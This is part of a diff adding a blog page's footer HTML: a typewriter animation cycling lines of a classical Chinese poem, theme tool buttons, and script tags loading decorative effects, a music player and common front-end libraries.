+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
